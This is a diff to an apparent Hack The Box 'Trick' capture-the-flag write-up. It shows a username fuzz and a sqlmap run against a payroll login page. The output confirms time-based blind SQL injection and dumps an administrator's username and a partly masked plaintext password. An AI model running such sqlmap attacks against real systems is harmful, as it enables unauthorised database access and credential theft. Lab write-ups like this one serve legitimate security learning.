@@ -442,7 +442,9 @@ So first just because i want to use the tool i wrote i'll do a username fuzz aga
 #"ROOT@debian.localdomain"
 #"SYS@debian.localdomain"
 ```
-so some interesting usernames, i'm sure that showed up in there log files too! 
+so some interesting usernames, i'm sure that showed up in their log files too!
+
+But they are all typical system files and if the admins have done their job right, most of these wont have ssh configured for their user, nor would root 
 
 #### Web Content
 
@@ -472,21 +474,34 @@ And we're in!
 
 Looking around the site is interesting enough but there's really not much to exploit directly on the page itself, but i want to try one more thing with the login page, sqlmap!
 
-###### SAVE
+so initally i just ran
+`sqlmap.py --method=POST --data="username=1&password=1" -u "http://preprod-payroll.trick.htb/ajax.php?action=login" -a`
+which would show EVERYTHING, but unfortunately sqlmap only has the ability to do this via
 ```
-POST /ajax.php?action=save_employee HTTP/1.1
-Host: preprod-payroll.trick.htb
-Content-Length: 93
-Accept: */*
-X-Requested-With: XMLHttpRequest
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-Origin: http://preprod-payroll.trick.htb
-Referer: http://preprod-payroll.trick.htb/index.php?page=employee
-Accept-Encoding: gzip, deflate
-Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
-Cookie: PHPSESSID=temjs3d2tirbi0snvh7uqcnedf
-Connection: close
+[12:59:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[13:00:07] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+```
 
-id=&firstname=Good&middlename=&lastname=Hackker&department_id=1&position_id=1&salary=10000000
+>Which means that this injection attempt may take a long time (as the system will be using time to determine what the server response is) i don't know if it does it like a=1ms b=2ms etc
+
+So initally we get back some banner notifications here
+```
+web application technology: Nginx 1.14.2, PHP
+[14:20:15] [INFO] fetching current user
+[14:20:15] [INFO] retrieved: remo@localhost
+current user: 'remo@localhost'
+
+```
+another username, this one seems to be an actual local user?
+
+Well it took a while, but i guess i really should've searched for the `users` table first thing, but anyway here it is! Unencrypted password too! tut! tut!
+```
+Table: users
+[1 entry]
++----+-----------+---------------+------+---------+---------+-----------------------+------------+
+| id | doctor_id | name          | type | address | contact | password              | username   |
++----+-----------+---------------+------+---------+---------+-----------------------+------------+
+| 1  | 0         | Administrator | 1    | <blank> | <blank> | Su*****************ke | Enemigosss |
++----+-----------+---------------+------+---------+---------+-----------------------+------------+
+
 ```
